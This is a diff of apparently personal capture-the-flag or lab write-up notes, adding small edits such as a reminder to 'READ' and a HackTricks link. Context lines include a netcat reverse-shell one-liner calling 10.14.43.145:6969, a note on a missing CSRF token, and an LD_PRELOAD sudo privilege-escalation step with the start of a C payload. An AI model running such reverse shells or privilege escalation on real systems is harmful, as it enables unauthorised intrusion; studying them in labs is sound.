@@ -9,6 +9,7 @@ Goals:
 Learnt:
 - Try Harder
 - Scrutinise integrity of password reset source code
+- READ
 Beyond Root:
 - H4ddixB4dg3r Programming for a hour!
 
@@ -34,6 +35,7 @@ Al points out No CSRF token
 
 Testing 
 ![](seewhathappens.png)
+
 Results in:
 ![](none.png)
 
@@ -122,7 +124,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.43.145 6969 >/tmp/f
 
 ![](didnotwork.png)
 
-Al points out how sudo is `env_keep+=LD_PRELOAD`, we have `gcc`
+Al points out how sudo is `env_keep+=LD_PRELOAD`, we have `gcc` - from [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)
 
 ```c
 #include <stdio.h>
